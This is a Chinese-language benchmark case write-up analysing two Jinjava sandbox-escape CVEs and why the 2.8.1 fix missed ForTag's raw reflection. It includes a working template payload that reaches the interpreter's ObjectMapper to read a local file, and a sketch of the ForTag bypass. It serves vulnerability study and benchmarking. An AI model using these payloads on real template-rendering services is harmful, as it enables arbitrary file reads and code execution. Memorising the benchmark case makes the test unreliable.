# Jinjava：getValue 拒了 Interpreter，ForTag 仍用裸反射把 config 取出来

- Case：`PCBV2-0200`
- 产品：HubSpot Jinjava（Maven Central `com.hubspot.jinjava:jinjava`）。运行时是整包 JAR + `RenderService`：`POST /render` → `new Jinjava().render(body, {})`。不是抽出来的函数。
- 链：CVE-2025-59340（2.8.0 → 2.8.1，GHSA-m49c-g9wr-hv6v）→ CVE-2026-25526（2.8.1 → 2.8.3，GHSA-gjx9-j8f8-7j74）。后一条标题：*Arbitrary Java Execution via JinJava Bypass through ForTag*。
- 源码对着 tag `jinjava-2.8.1` 的 `JinjavaBeanELResolver.java`、`ForTag.java`。金丝雀是入口写入的 `/flag`（JSON 字符串字面量），默认沙箱不能读文件。

GHSA-m49c-g9wr-hv6v 写明：内置变量 `____int3rpr3t3r____` 能走到 `config` 上的 Jackson `ObjectMapper`，再用 `constructFromCanonical` + `readValue` 实例化 `java.net.URL` 读本地文件。2.8.1 在 `getValue` 入口加了 `isRestrictedClass(base)`。2.8.3 才承认 ForTag 的 `Introspector` + `getReadMethod().invoke` 根本不走这条入口。

根因不只是「漏了一个标签」。检查插在「EL `getValue` 的 base 是不是受限类」上；真正拿到 `ObjectMapper` 的还可以是 ForTag 循环里的裸 getter。同一次 resolver 的 `invoke()` 已经对 base **和** 返回值都做了 `isRestrictedClass`，ForTag 却绕开 resolver。下面按请求走进去。

---

## 这块功能本来在干什么

Jinjava 渲染用户模板。本 case 的服务把 body 当模板，空 context：

```java
// RenderService.handleRender
new Jinjava().render(body, new HashMap<>());
```

```http
POST /render
{% set x = 1 %}{{ x }}
```

内置名 `____int3rpr3t3r____`（`ExtendedParser.INTERPRETER`）指向当前 `JinjavaInterpreter`。设计意图：模板可以读 context 里的业务对象，不能摸解释器、不能 new 任意类、不能读盘。成功穿越之后的效果是：**拿到 config 上的 `ObjectMapper`，`convertValue` 出 `file:///flag` 的 `URL`，`readValue` 成 String，响应里出现 `PCBFLAG_...`**。

数据流：

```text
POST /render
  {% set om = ____int3rpr3t3r____.config.objectMapper %}
  …
  FLAG:{{ om.readValue(url, st) }}
    → Jinjava.render
         EL：JinjavaBeanELResolver.getValue
              V1：isRestrictedClass(interpreter) → null
         ForTag（残余）：Introspector + getReadMethod().invoke
              不经 getValue
         ObjectMapper.constructFromCanonical / convertValue / readValue
    → HTTP body 里 PCBFLAG_...
```

这是库 API。没有鉴权。`/flag` 不在 context 里。

---

## 原始漏洞：解释器属性一直通到 ObjectMapper（CVE-2025-59340，2.8.0）

2.8.0 的 `isRestrictedClass` 已经把 `JinjavaInterpreter` 列进去，但只用在 `invoke()`（拦方法调用），**不用在 `getValue()`**。GHSA-m49c-g9wr-hv6v：*interacting with the properties of JinjavaInterpreter instances remains unrestricted*。于是属性链合法：

```text
____int3rpr3t3r____.config.objectMapper
```

`ObjectMapper` 不是受限类。`typeFactory.constructFromCanonical('java.net.URL')` + `convertValue('file:///flag', ut)` + `readValue(url, String)` 读出 `/flag`。seed 模板：

```jinja
{% set om = ____int3rpr3t3r____.config.objectMapper %}
{% set st = om.typeFactory.constructFromCanonical('java.lang.String') %}
{% set ut = om.typeFactory.constructFromCanonical('java.net.URL') %}
{% set url = om.convertValue('file:///flag', ut) %}
FLAG:{{ om.readValue(url, st) }}
```

2.8.0 上 `/render` 响应出现 `PCBFLAG_...`。这就是 v0 + `--seed` 观察到 flag。

---

## 维护者改了什么（CVE-2025-59340 修复，2.8.1）

2.8.1 只在 `getValue` 开头加了三行。对着 tag `jinjava-2.8.1`：

```java
// JinjavaBeanELResolver.java  (jinjava-2.8.1)
@Override
public Object getValue(ELContext context, Object base, Object property) {
  if (isRestrictedClass(base)) {
    return null;
  }
  Object result = super.getValue(context, base, validatePropertyName(property));
  return result instanceof Class ? null : result;
}

protected boolean isRestrictedClass(Object o) {
  if (o == null) return false;
  return (
    (o.getClass().getPackage() != null &&
     o.getClass().getPackage().getName().startsWith("java.lang.reflect")) ||
    o instanceof Class ||
    o instanceof ClassLoader ||
    o instanceof Thread ||
    o instanceof Method ||
    o instanceof Field ||
    o instanceof Constructor ||
    o instanceof JinjavaInterpreter
  );
}
```

V1 谓词的字面意思：EL 属性读取的 **base** 若是 Interpreter（或其它 listed 类型），整段变 null。`____int3rpr3t3r____.config` 的 base 就是 Interpreter，链塌掉，`om` 为 null，`readValue` 走不下去。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险的解释器逃逸只走 EL `getValue`。
2. 只要 Interpreter 当不了 base，`ObjectMapper` 就摸不到。

第一点不成立。ForTag 在「循环变量不是 Map/List/Entry」时，用 `java.beans.Introspector` 自己找 getter。

---

## 消毒之后，值怎么接到 ObjectMapper 上

`getValue` 返回 null 之后，**同一份** `ForTag.renderForCollection` 还在用反射拆对象。对着 2.8.1：

```java
// ForTag.java :: renderForCollection  (jinjava-2.8.1)
} else {
  try {
    PropertyDescriptor[] valProps = Introspector
      .getBeanInfo(val.getClass())
      .getPropertyDescriptors();
    for (PropertyDescriptor valProp : valProps) {
      if (loopVar.equals(valProp.getName())) {
        interpreter.getContext()
          .put(loopVar, valProp.getReadMethod().invoke(val));
        break;
      }
    }
  } catch (Exception e) {
    throw new InterpretException(...);
  }
}
```

`{% for _, config in ____int3rpr3t3r____ %}` 时，`val` 是 Interpreter，不是 Map/List。`Introspector` 看见 `getConfig()`，`loopVar.equals("config")`，`invoke` 得到 `JinjavaConfig`。后面的 `{{ config.objectMapper }}` 的 base 已经是 Config，不再是 Interpreter，V1 的 `getValue` 放行。

过滤器刚看过的是「EL 读取的 base」；消费者看到的是「ForTag 写进 context 的那个 config，再经普通 EL 走到 ObjectMapper」。两套取值中间没有第二次 `isRestrictedClass`。

`readValue(file:///flag, String)` 的结果拼进模板输出，原样进 HTTP body。金丝雀能出现，依据就是这次反序列化读盘，而不是「模板里写了这段字」。

---

## 仓库里已经有更强的检查，ForTag 没用

同一份 `JinjavaBeanELResolver` 的 `invoke()` 在 2.8.1 上已经：

```java
if (isRestrictedClass(base)) {
  throw new MethodNotFoundException(...);
}
Object result = super.invoke(...);
if (isRestrictedClass(result)) {
  throw new MethodNotFoundException(...);
}
```

`validatePropertyName` 还禁了 `class` / `getClass`。谁走这些谓词：

| 路径 | `isRestrictedClass` / resolver |
|---|---|
| EL `getValue`（V1 新加） | 只查 base |
| EL `invoke` | base **和** 返回值 |
| ForTag `getReadMethod().invoke` | **否** |
| `ObjectMapper` 本身 | 2.8.1 **未**列入受限包 |

V1 等于在 EL 读取入口又做了一个和 `invoke` 同级的 base 检查，而 ForTag 那条「按属性名调 getter」始终不经 resolver。不是没有更好的谓词，是 **循环解构没用**。GHSA-gjx9-j8f8-7j74 的修复说明第一句就是：*Added security checks to ForTag.renderForCollection() to enforce JinjavaBeanELResolver restrictions*。

即便没有 ForTag，`isRestrictedClass` 在 2.8.1 也不含 `com.fasterxml.jackson.databind`。一旦有任何路径把 mapper 暴露成普通对象，`constructFromCanonical` 仍然是实例化原语。V2 两条一起补。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 反射」落到具体代码：

- V1 `getValue`：`base instanceof JinjavaInterpreter` → null
- ForTag：`valProp.getReadMethod().invoke(val)` → 返回 `config`

只要用 for 循环按属性名把 Interpreter 拆开，第一行不会跑，第二行仍然把 `JinjavaConfig` 放进 context，后面的 ObjectMapper 链与 seed 相同。

```text
seed:     {{ ____int3rpr3t3r____.config.objectMapper ... readValue }}
          → getValue(base=Interpreter) = null → 无 flag

residual: {% for _, config in ____int3rpr3t3r____ %}
            {% set om = config.objectMapper %}
            … 同一套 constructFromCanonical / readValue …
          {% endfor %}
          → ForTag invoke(getConfig) → context['config']
          → getValue(base=Config) 放行 → 读到 /flag
```

同一 `ObjectMapper` sink，不同到达方式。GHSA-gjx9-j8f8-7j74 把 ForTag 写成根因，并演示读 `/etc/passwd`；本 case 换成 `/flag`。

---

## 残余走 ForTag 反射，仍是同一 ObjectMapper（CVE-2026-25526）

没有换渲染入口、没有换内置解释器名、没有换读盘原语。还是：

```http
POST /render
（ForTag 取出 config，再走 objectMapper.readValue(file:///flag)）
```

`Jinjava.render` 仍然求值整张模板。V1 的 `getValue` 照样执行（直接 `.config` 仍然是 null）；ForTag 不经 `getValue`；`readValue` 仍读 `/flag`。

**和平台 `verify.sh` 的关系。**  
本平台 `--residual` 仍是 TODO，默认回落 seed（直接 `____int3rpr3t3r____.config`）。那条路径在 V1 上已被 `getValue` 挡住，**不是** incomplete-fix 链上的残余。真正的残余是 advisory 的 ForTag 反射，sink 仍是 config 上的 `ObjectMapper`。文章按 2.8.1 源码 + GHSA-gjx9-j8f8-7j74 写，不按 verify 的 TODO 回落把 seed 再讲一遍。

---

## 后来又补了什么（CVE-2026-25526，2.8.3）

2.8.3 把 ForTag 的 `invoke` 换成 `interpreter.resolveProperty`（走受限 resolver），并扩大 `isRestrictedClass`：jackson.databind 包、`readValueAs`、以及若干配置对象。GHSA 列的修复组件包括 ForTag hardening、type validation、ObjectMapper restrictions。

对残余输入：ForTag 取 `config` 时经过 resolver，Interpreter 仍受限，循环变量拿不到真实 config；即便拿到，`ObjectMapper` 也开始被限制。公开建议是升级到 2.8.3 / 2.7.6。

即便如此，沙箱仍是「解释器 + 包名黑名单」，不是「模板不能实例化任意 JavaType」。对 ForTag + `file:///flag` 这条已知链它够用。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 EL `getValue` 的 base。真正读盘的是 `ObjectMapper.readValue`。V1 没把「取 Interpreter 的属性」收成唯一入口。V2 才把 ForTag 接回 resolver，并开始限制 mapper 本身。

**不是没有更好的谓词。**  
`invoke()` 已经对 base 和返回值做 `isRestrictedClass`。ForTag 自己 `Introspector`。从 2.8.1 的 diff 只能看到 `getValue` 多了三行；要判断补丁是否闭合，必须看到 `ForTag` 那个 `else` 分支。

**同一 `render()`，只换了到达 config 的语法。**  
任何把用户模板交给 `Jinjava.render` 的服务，在 2.8.1 上都吃「EL 受限、ForTag 不受限」这道缝。advisory 已写明 custom code templates。

**`____int3rpr3t3r____` 几乎没有对外隐藏。**  
它是内置名，不是业务 context。若渲染前从 context 拿掉这个名字，后面的 `getValue` 和 ForTag 都不会被逼去近似「解释器安全」。

**金丝雀在沙箱外的文件系统上是有意的。**  
`/flag` 不在 `{}` 里。能出现在 `/render` 响应，说明 `readValue` 读到了盘，不是「模板引擎回显了字符串」。

---

## 版本、入口、参考

| | Maven | `getValue` | ForTag 取属性 | 直接 `.config` seed | ForTag `config` residual |
|---|---|---|---|---|---|
| V0 | 2.8.0 | 不查 Interpreter | 裸 `invoke` | 读到 /flag | （也能） |
| V1 | 2.8.1 | `isRestrictedClass(base)` | **仍裸** | 链塌掉 | 读到 /flag |
| V2 | 2.8.3 | 同 V1 + jackson 限制 | `resolveProperty` | 挡 | 挡 |

- 库 API：`new Jinjava().render(template, context)`
- HTTP 面：`POST /render`（`RenderService`）
- 平台 `verify.sh --residual` 目前 TODO、回落 seed。那不是本链的残余到达方式。
- [CVE-2025-59340](https://nvd.nist.gov/vuln/detail/CVE-2025-59340)、[GHSA-m49c-g9wr-hv6v](https://github.com/HubSpot/jinjava/security/advisories/GHSA-m49c-g9wr-hv6v)
- [CVE-2026-25526](https://nvd.nist.gov/vuln/detail/CVE-2026-25526)、[GHSA-gjx9-j8f8-7j74](https://github.com/HubSpot/jinjava/security/advisories/GHSA-gjx9-j8f8-7j74)
- V1 blob：[`JinjavaBeanELResolver.java` @ jinjava-2.8.1](https://github.com/HubSpot/jinjava/blob/jinjava-2.8.1/src/main/java/com/hubspot/jinjava/el/ext/JinjavaBeanELResolver.java)、[`ForTag.java` @ jinjava-2.8.1](https://github.com/HubSpot/jinjava/blob/jinjava-2.8.1/src/main/java/com/hubspot/jinjava/lib/tag/ForTag.java)
- V2 对照：tag `jinjava-2.8.3` 同一对文件
